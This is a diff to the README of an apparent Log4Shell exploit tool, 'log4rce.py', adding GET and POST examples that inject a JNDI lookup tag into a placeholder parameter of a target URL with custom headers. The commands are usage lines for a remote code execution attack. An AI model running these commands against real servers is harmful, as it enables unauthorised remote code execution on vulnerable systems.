@@ -33,13 +33,21 @@ The tool allows you to use a few attack modes. These attacks are extensions of t
 
 #### HTTP
 
-You can perform an automatic HTTP post request using the following:
+You can perform an automated HTTP request attack on a target URL.
+
+You can perform a GET request as follows:
 
 ```
-python3 log4rce.py http --url "http://www.vuln.com:1234/" --data "vuln_param=###"
+python3 log4rce.py http --url "http://www.vuln.com:1234/?vuln_param=###&param=123" --headers="P1=123&P2=123"
 ```
 
-The previous will inject the JNDI tag into the `###` in the form data.
+You can perform a POST request as follows:
+
+```
+python3 log4rce.py http -X POST --url "http://www.vuln.com:1234/" --data "vuln_param=###&param=123" --headers="P1=123&P2=123"
+```
+
+The previous will inject the JNDI tag into `###`.
 
 #### Manual
 
